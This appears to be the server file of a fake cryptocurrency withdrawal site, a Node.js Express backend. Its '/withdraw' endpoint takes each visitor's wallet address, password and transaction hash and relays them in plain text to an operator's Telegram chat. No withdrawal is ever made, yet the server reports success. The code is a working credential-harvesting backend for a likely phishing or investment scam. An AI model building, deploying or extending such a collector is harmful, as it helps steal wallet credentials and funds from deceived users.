// server.js
const express = require("express");
const path = require("path");
const axios = require("axios");
const bodyParser = require("body-parser");
const cors = require("cors");

const app = express();

// parse json
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Enable CORS for all origins (for dev). If you want, restrict to your domain later.
app.use(cors({
  origin: true,
  methods: ["GET","POST","OPTIONS"],
  allowedHeaders: ["Content-Type","Authorization"]
}));

// respond to preflight
app.options("*", (req, res) => res.sendStatus(204));

// serve static files from /public
const publicDir = path.join(__dirname, "public");
app.use(express.static(publicDir));

// health
app.get("/healthz", (req, res) => res.json({ ok: true }));

// main withdraw endpoint
app.post("/withdraw", async (req, res) => {
  try {
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

    if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
      console.error("Missing BOT_TOKEN or ADMIN_CHAT_ID");
      return res.status(500).json({ success: false, error: "Server misconfigured" });
    }

    const { coin, amount, usdt, wallet, password, hash } = req.body || {};

    if (!coin || !amount || !wallet || !hash) {
      return res.status(400).json({ success: false, error: "Missing required fields" });
    }

    const message = [
      "📤 NEW WITHDRAWAL REQUEST",
      "--------------------------------",
      `💰 Coin: ${coin}`,
      `🔢 Amount: ${amount}`,
      `💵 USDT: ${usdt}`,
      `🏦 Wallet: ${wallet}`,
      `🔐 Password: ${password}`,
      `🆔 Transaction Hash: ${hash}`,
      "⚠️ Wallet & password can be bound once.",
      "Please screenshot the transaction hash for record."
    ].join("\n");

    const tgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const payload = {
      chat_id: ADMIN_CHAT_ID,
      text: message,
      parse_mode: "HTML"
    };

    // send to Telegram
    await axios.post(tgUrl, payload, { timeout: 10000 });

    console.log("✔ Withdrawal sent to Telegram:", hash);
    return res.json({ success: true });
  } catch (err) {
    console.error("❌ /withdraw error:", err?.response?.data || err.message || err);
    // If Telegram returned a 4xx/5xx, surface a helpful message for debugging but not internal details
    return res.status(500).json({ success: false, error: "Server error" });
  }
});

// compatibility for older frontend using /api/wallet
app.post("/api/wallet", (req, res) => {
  // delegate to /withdraw handler
  req.url = "/withdraw";
  app.handle(req, res);
});

// SPA fallback - serve index.html for unknown GETs
app.get("*", (req, res) => {
  res.sendFile(path.join(publicDir, "index.html"));
});

// start on railway port
const PORT = Number(process.env.PORT) || 3000;
app.listen(PORT, () => {
  console.log("✅ Telegram env loaded");
  console.log("🚀 Server running on port", PORT);
});
